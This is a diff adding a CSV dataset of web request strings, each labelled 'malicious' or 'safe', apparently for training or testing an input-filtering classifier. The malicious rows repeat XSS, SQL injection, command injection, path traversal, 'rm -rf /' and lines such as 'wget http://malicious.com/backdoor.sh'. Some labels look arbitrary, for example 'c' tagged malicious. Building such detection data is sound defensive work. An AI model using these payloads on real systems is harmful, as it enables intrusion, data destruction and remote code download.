@@ -1,0 +1,602 @@
+request,label
+"curl http://evil.com",malicious
+"<img src='x' onerror='alert(1)'>",malicious
+"<iframe src='http://evil.com'></iframe>",malicious
+<b>Welcome</b>,safe
+<script>alert(1)</script>,malicious
+wget http://malicious.com/backdoor.sh,malicious
+contact form,safe
+<iframe src='http://evil.com'></iframe>,malicious
+system('ls'),malicious
+' UNION SELECT * FROM users --,malicious
+<b>Welcome</b>,safe
+contact form,safe
+<svg onload=alert(1)>,malicious
+feedback=Great+App!,safe
+wget http://malicious.com/backdoor.sh,malicious
+login success,safe
+wget http://malicious.com/backdoor.sh,malicious
+<iframe src='http://evil.com'></iframe>,malicious
+' UNION SELECT * FROM users --,malicious
+contact form,safe
+dashboard,safe
+`rm -rf /`,malicious
+0x50 + 0x51,malicious
+<iframe src='http://evil.com'></iframe>,malicious
+wget http://malicious.com/backdoor.sh,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+index.html,safe
+<svg onload=alert(1)>,malicious
+username=monica&password=secure123,safe
+' OR '1'='1,malicious
+' OR '1'='1,malicious
+contact form,safe
+search?q=python,safe
+curl http://evil.com,malicious
+docs.html,safe
+'; DROP TABLE users; --,malicious
+email=hi@example.com,safe
+feedback=Great+App!,safe
+search?q=python,safe
+reset-password,safe
+system('ls'),malicious
+username=monica&password=secure123,safe
+reset-password,safe
+signup success,safe
+signup success,safe
+<body onload=alert('hack')>,malicious
+home page,safe
+contact form,safe
+home page,safe
+curl http://evil.com,malicious
+system('ls'),malicious
+signup success,safe
+wget http://malicious.com/backdoor.sh,malicious
+`rm -rf /`,malicious
+0x50 + 0x51,malicious
+c,malicious
+index.html,safe
+dashboard,safe
+email=hi@example.com,safe
+wget http://malicious.com/backdoor.sh,malicious
+user-profile,safe
+ping 127.0.0.1; ls,malicious
+search?q=python,safe
+dashboard,safe
+wget http://malicious.com/backdoor.sh,malicious
+status=active,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+<img src='x' onerror='alert(1)'>,malicious
+docs.html,safe
+curl http://evil.com,malicious
+search?q=python,safe
+../../etc/passwd,malicious
+search?q=python,safe
+signup success,safe
+contact form,safe
+feedback=Great+App!,safe
+hello world,safe
+|| ls -la,malicious
+<script>alert(1)</script>,malicious
+email=hi@example.com,safe
+contact form,safe
+wget http://malicious.com/backdoor.sh,malicious
+' OR '1'='1,malicious
+|| ls -la,malicious
+curl http://evil.com,malicious
+wget http://malicious.com/backdoor.sh,malicious
+<img src='x' onerror='alert(1)'>,malicious
+' OR 'a'='a,malicious
+<img src='x' onerror='alert(1)'>,malicious
+<script>alert(1)</script>,malicious
+search?q=python,safe
+|| ls -la,malicious
+signup success,safe
+' UNION SELECT * FROM users --,malicious
+profile-picture=default.jpg,safe
+user-profile,safe
+home page,safe
+dashboard,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+curl http://evil.com,malicious
+reset-password,safe
+GET /products?id=25,safe
+GET /products?id=25,safe
+settings,safe
+'; DROP TABLE users; --,malicious
+system('ls'),malicious
+username=monica&password=secure123,safe
+<body onload=alert('hack')>,malicious
+hello world,safe
+feedback=Great+App!,safe
+system('ls'),malicious
+GET /products?id=25,safe
+<iframe src='http://evil.com'></iframe>,malicious
+' OR 'a'='a,malicious
+docs.html,safe
+login success,safe
+<body onload=alert('hack')>,malicious
+admin' --,malicious
+curl http://evil.com,malicious
+signup success,safe
+admin' --,malicious
+<img src='x' onerror='alert(1)'>,malicious
+settings,safe
+<b>Welcome</b>,safe
+admin' --,malicious
+docs.html,safe
+hello world,safe
+' UNION SELECT * FROM users --,malicious
+status=active,safe
+settings,safe
+username=monica&password=secure123,safe
+GET /products?id=25,safe
+' OR '1'='1,malicious
+' OR '1'='1,malicious
+' OR 'a'='a,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+index.html,safe
+`rm -rf /`,malicious
+' OR 'a'='a,malicious
+search?q=python,safe
+<svg onload=alert(1)>,malicious
+settings,safe
+reset-password,safe
+hello world,safe
+login success,safe
+0x50 + 0x51,malicious
+email=hi@example.com,safe
+<iframe src='http://evil.com'></iframe>,malicious
+<script>alert(1)</script>,malicious
+../../etc/passwd,malicious
+ping 127.0.0.1; ls,malicious
+contact form,safe
+../../etc/passwd,malicious
+user-profile,safe
+email=hi@example.com,safe
+' OR '1'='1,malicious
+|| ls -la,malicious
+ping 127.0.0.1; ls,malicious
+login success,safe
+' OR 'a'='a,malicious
+user-profile,safe
+email=hi@example.com,safe
+login success,safe
+GET /products?id=25,safe
+ping 127.0.0.1; ls,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+curl http://evil.com,malicious
+docs.html,safe
+' OR 'a'='a,malicious
+index.html,safe
+docs.html,safe
+' OR 'a'='a,malicious
+ping 127.0.0.1; ls,malicious
+username=monica&password=secure123,safe
+../../etc/passwd,malicious
+home page,safe
+'; DROP TABLE users; --,malicious
+user-profile,safe
+email=hi@example.com,safe
+email=hi@example.com,safe
+admin' --,malicious
+curl http://evil.com,malicious
+' OR '1'='1,malicious
+' UNION SELECT * FROM users --,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+'; DROP TABLE users; --,malicious
+system('ls'),malicious
+'; DROP TABLE users; --,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+search?q=python,safe
+admin' --,malicious
+profile-picture=default.jpg,safe
+<script>alert(1)</script>,malicious
+<body onload=alert('hack')>,malicious
+settings,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+' OR '1'='1,malicious
+`rm -rf /`,malicious
+`rm -rf /`,malicious
+<body onload=alert('hack')>,malicious
+login success,safe
+GET /products?id=25,safe
+<iframe src='http://evil.com'></iframe>,malicious
+' OR 'a'='a,malicious
+<iframe src='http://evil.com'></iframe>,malicious
+user-profile,safe
+contact form,safe
+/about-us,safe
+admin' --,malicious
+feedback=Great+App!,safe
+`rm -rf /`,malicious
+' OR 'a'='a,malicious
+ping 127.0.0.1; ls,malicious
+index.html,safe
+`rm -rf /`,malicious
+user-profile,safe
+hello world,safe
+system('ls'),malicious
+wget http://malicious.com/backdoor.sh,malicious
+'; DROP TABLE users; --,malicious
+<svg onload=alert(1)>,malicious
+email=hi@example.com,safe
+' UNION SELECT * FROM users --,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+status=active,safe
+GET /products?id=25,safe
+system('ls'),malicious
+status=active,safe
+profile-picture=default.jpg,safe
+contact form,safe
+dashboard,safe
+<body onload=alert('hack')>,malicious
+' OR '1'='1,malicious
+username=monica&password=secure123,safe
+|| ls -la,malicious
+home page,safe
+/about-us,safe
+<script>alert(1)</script>,malicious
+system('ls'),malicious
+index.html,safe
+<svg onload=alert(1)>,malicious
+email=hi@example.com,safe
+search?q=python,safe
+hello world,safe
+../../etc/passwd,malicious
+0x50 + 0x51,malicious
+admin' --,malicious
+curl http://evil.com,malicious
+../../etc/passwd,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+docs.html,safe
+login success,safe
+settings,safe
+wget http://malicious.com/backdoor.sh,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+0x50 + 0x51,malicious
+GET /products?id=25,safe
+reset-password,safe
+<script>alert(1)</script>,malicious
+<iframe src='http://evil.com'></iframe>,malicious
+contact form,safe
+contact form,safe
+home page,safe
+<iframe src='http://evil.com'></iframe>,malicious
+contact form,safe
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+search?q=python,safe
+wget http://malicious.com/backdoor.sh,malicious
+admin' --,malicious
+curl http://evil.com,malicious
+profile-picture=default.jpg,safe
+/about-us,safe
+ping 127.0.0.1; ls,malicious
+index.html,safe
+' OR '1'='1,malicious
+curl http://evil.com,malicious
+<b>Welcome</b>,safe
+<b>Welcome</b>,safe
+/about-us,safe
+|| ls -la,malicious
+|| ls -la,malicious
+`rm -rf /`,malicious
+' OR '1'='1,malicious
+dashboard,safe
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+GET /products?id=25,safe
+<script>alert(1)</script>,malicious
+index.html,safe
+home page,safe
+admin' --,malicious
+username=monica&password=secure123,safe
+' OR 'a'='a,malicious
+email=hi@example.com,safe
+<iframe src='http://evil.com'></iframe>,malicious
+' OR '1'='1,malicious
+<iframe src='http://evil.com'></iframe>,malicious
+ping 127.0.0.1; ls,malicious
+<img src='x' onerror='alert(1)'>,malicious
+email=hi@example.com,safe
+reset-password,safe
+settings,safe
+0x50 + 0x51,malicious
+signup success,safe
+status=active,safe
+|| ls -la,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+' OR '1'='1,malicious
+status=active,safe
+profile-picture=default.jpg,safe
+<body onload=alert('hack')>,malicious
+<iframe src='http://evil.com'></iframe>,malicious
+email=hi@example.com,safe
+feedback=Great+App!,safe
+<b>Welcome</b>,safe
+feedback=Great+App!,safe
+username=monica&password=secure123,safe
+admin' --,malicious
+GET /products?id=25,safe
+user-profile,safe
+hello world,safe
+feedback=Great+App!,safe
+hello world,safe
+' OR 'a'='a,malicious
+username=monica&password=secure123,safe
+<iframe src='http://evil.com'></iframe>,malicious
+dashboard,safe
+GET /products?id=25,safe
+' OR '1'='1,malicious
+../../etc/passwd,malicious
+home page,safe
+curl http://evil.com,malicious
+ping 127.0.0.1; ls,malicious
+GET /products?id=25,safe
+search?q=python,safe
+dashboard,safe
+`rm -rf /`,malicious
+feedback=Great+App!,safe
+<b>Welcome</b>,safe
+profile-picture=default.jpg,safe
+<body onload=alert('hack')>,malicious
+<svg onload=alert(1)>,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+<svg onload=alert(1)>,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+<img src='x' onerror='alert(1)'>,malicious
+'; DROP TABLE users; --,malicious
+' OR '1'='1,malicious
+docs.html,safe
+' OR 'a'='a,malicious
+|| ls -la,malicious
+contact form,safe
+login success,safe
+feedback=Great+App!,safe
+admin' --,malicious
+ping 127.0.0.1; ls,malicious
+search?q=python,safe
+login success,safe
+<body onload=alert('hack')>,malicious
+' UNION SELECT * FROM users --,malicious
+|| ls -la,malicious
+dashboard,safe
+' UNION SELECT * FROM users --,malicious
+username=monica&password=secure123,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+username=monica&password=secure123,safe
+'; DROP TABLE users; --,malicious
+signup success,safe
+home page,safe
+<b>Welcome</b>,safe
+<iframe src='http://evil.com'></iframe>,malicious
+user-profile,safe
+0x50 + 0x51,malicious
+system('ls'),malicious
+0x50 + 0x51,malicious
+curl http://evil.com,malicious
+/about-us,safe
+<body onload=alert('hack')>,malicious
+0x50 + 0x51,malicious
+hello world,safe
+dashboard,safe
+admin' --,malicious
+feedback=Great+App!,safe
+admin' --,malicious
+home page,safe
+dashboard,safe
+<svg onload=alert(1)>,malicious
+system('ls'),malicious
+docs.html,safe
+<script>alert(1)</script>,malicious
+search?q=python,safe
+username=monica&password=secure123,safe
+<body onload=alert('hack')>,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+hello world,safe
+hello world,safe
+email=hi@example.com,safe
+<body onload=alert('hack')>,malicious
+wget http://malicious.com/backdoor.sh,malicious
+<b>Welcome</b>,safe
+`rm -rf /`,malicious
+feedback=Great+App!,safe
+search?q=python,safe
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+<script>alert(1)</script>,malicious
+dashboard,safe
+status=active,safe
+hello world,safe
+user-profile,safe
+0x50 + 0x51,malicious
+GET /products?id=25,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+profile-picture=default.jpg,safe
+../../etc/passwd,malicious
+ping 127.0.0.1; ls,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+user-profile,safe
+GET /products?id=25,safe
+<iframe src='http://evil.com'></iframe>,malicious
+user-profile,safe
+GET /products?id=25,safe
+<body onload=alert('hack')>,malicious
+search?q=python,safe
+/about-us,safe
+home page,safe
+contact form,safe
+email=hi@example.com,safe
+<script>alert(1)</script>,malicious
+search?q=python,safe
+<body onload=alert('hack')>,malicious
+GET /products?id=25,safe
+../../etc/passwd,malicious
+contact form,safe
+' OR '1'='1,malicious
+<img src='x' onerror='alert(1)'>,malicious
+0x50 + 0x51,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+wget http://malicious.com/backdoor.sh,malicious
+' OR '1'='1,malicious
+contact form,safe
+<img src='x' onerror='alert(1)'>,malicious
+signup success,safe
+docs.html,safe
+email=hi@example.com,safe
+hello world,safe
+../../etc/passwd,malicious
+status=active,safe
+' UNION SELECT * FROM users --,malicious
+feedback=Great+App!,safe
+status=active,safe
+admin' --,malicious
+admin' --,malicious
+reset-password,safe
+profile-picture=default.jpg,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+<iframe src='http://evil.com'></iframe>,malicious
+' UNION SELECT * FROM users --,malicious
+curl http://evil.com,malicious
+docs.html,safe
+<script>alert(1)</script>,malicious
+login success,safe
+dashboard,safe
+index.html,safe
+user-profile,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+' OR '1'='1,malicious
+admin' --,malicious
+home page,safe
+' OR 'a'='a,malicious
+email=hi@example.com,safe
+<img src='x' onerror='alert(1)'>,malicious
+hello world,safe
+signup success,safe
+|| ls -la,malicious
+profile-picture=default.jpg,safe
+ping 127.0.0.1; ls,malicious
+ping 127.0.0.1; ls,malicious
+settings,safe
+GET /products?id=25,safe
+' OR 'a'='a,malicious
+username=monica&password=secure123,safe
+wget http://malicious.com/backdoor.sh,malicious
+dashboard,safe
+feedback=Great+App!,safe
+<b>Welcome</b>,safe
+profile-picture=default.jpg,safe
+feedback=Great+App!,safe
+search?q=python,safe
+reset-password,safe
+|| ls -la,malicious
+docs.html,safe
+email=hi@example.com,safe
+status=active,safe
+reset-password,safe
+' OR '1'='1,malicious
+home page,safe
+contact form,safe
+user-profile,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+email=hi@example.com,safe
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+admin' --,malicious
+/about-us,safe
+<iframe src='http://evil.com'></iframe>,malicious
+<b>Welcome</b>,safe
+home page,safe
+<iframe src='http://evil.com'></iframe>,malicious
+ping 127.0.0.1; ls,malicious
+reset-password,safe
+GET /products?id=25,safe
+username=monica&password=secure123,safe
+' OR 'a'='a,malicious
+wget http://malicious.com/backdoor.sh,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+home page,safe
+' OR '1'='1,malicious
+' UNION SELECT * FROM users --,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+'; DROP TABLE users; --,malicious
+home page,safe
+<iframe src='http://evil.com'></iframe>,malicious
+docs.html,safe
+admin' --,malicious
+/about-us,safe
+<img src='x' onerror='alert(1)'>,malicious
+curl http://evil.com,malicious
+<b>Welcome</b>,safe
+'; DROP TABLE users; --,malicious
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+<form action='http://evil.com'><input type='submit'></form>,malicious
+username=monica&password=secure123,safe
+GET /products?id=25,safe
+<b>Welcome</b>,safe
+user-profile,safe
+`rm -rf /`,malicious
+|| ls -la,malicious
+ping 127.0.0.1; ls,malicious
+<body onload=alert('hack')>,malicious
+user-profile,safe
+docs.html,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+signup success,safe
+feedback=Great+App!,safe
+<svg onload=alert(1)>,malicious
+login success,safe
+<b>Welcome</b>,safe
+curl http://evil.com,malicious
+curl http://evil.com,malicious
+curl http://evil.com,malicious
+profile-picture=default.jpg,safe
+index.html,safe
+' OR 'a'='a,malicious
+/about-us,safe
+contact form,safe
+login success,safe
+settings,safe
+signup success,safe
+settings,safe
+settings,safe
+settings,safe
+hello world,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+<svg onload=alert(1)>,malicious
+docs.html,safe
+dashboard,safe
+index.html,safe
+<form action='http://evil.com'><input type='submit'></form>,malicious
+reset-password,safe
+settings,safe
+|| ls -la,malicious
+settings,safe
+<script>alert(1)</script>,malicious
+' UNION SELECT * FROM users --,malicious
+reset-password,safe
+../../etc/passwd,malicious
+login success,safe
+status=active,safe
+../../etc/passwd,malicious
+<img src='x' onerror='alert(1)'>,malicious
+login success,safe
+../../etc/passwd,malicious
+<b>Welcome</b>,safe
+profile-picture=default.jpg,safe
+<link rel='stylesheet' href='http://malicious.com/style.css'>,malicious
+search?q=python,safe
+../../etc/passwd,malicious
+username=monica&password=secure123,safe
+dashboard,safe
+signup success,safe
+curl http://evil.com,malicious
+wget http://malicious.com/backdoor.sh,malicious
+'; DROP TABLE users; --,malicious
+curl http://evil.com,malicious
+search?q=python,safe
+contact form,safe
+' UNION SELECT * FROM users --,malicious
+<script>alert(1)</script>,malicious
+user-profile,safe
+signup success,safe
+
